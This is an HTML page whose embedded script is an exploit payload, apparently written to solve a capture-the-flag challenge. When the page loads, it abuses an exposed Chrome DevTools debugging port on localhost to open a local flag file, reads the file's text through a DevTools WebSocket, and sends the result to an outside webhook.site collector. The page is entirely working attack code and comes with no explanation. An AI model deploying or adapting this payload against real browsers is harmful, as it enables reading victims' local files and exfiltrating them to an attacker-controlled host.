
<!doctype html>
<html>
<body>
<script>
(async () => {
  const collector = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";
  const report = async (key, value) => {
    await fetch(
      collector + "?" + key + "=" + encodeURIComponent(value),
      { mode: "no-cors" }
    );
  };

  try {
    const response = await fetch(
      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
      { method: "PUT" }
    );

    if (!response.ok) {
      throw new Error("DevTools returned HTTP " + response.status);
    }

    const target = await response.json();
    const ws = new WebSocket(target.webSocketDebuggerUrl);

    ws.onopen = () => {
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
          expression: "document.body.innerText",
          returnByValue: true
        }
      }));
    };

    ws.onmessage = async (event) => {
      const message = JSON.parse(event.data);
      if (message.id !== 1) return;

      await report(
        "result",
        message.result?.result?.value ?? JSON.stringify(message)
      );
      ws.close();
    };

    ws.onerror = () => report("error", "WebSocket connection failed");
  } catch (error) {
    await report("error", String(error));
  }
})();
</script>
</body>
</html>
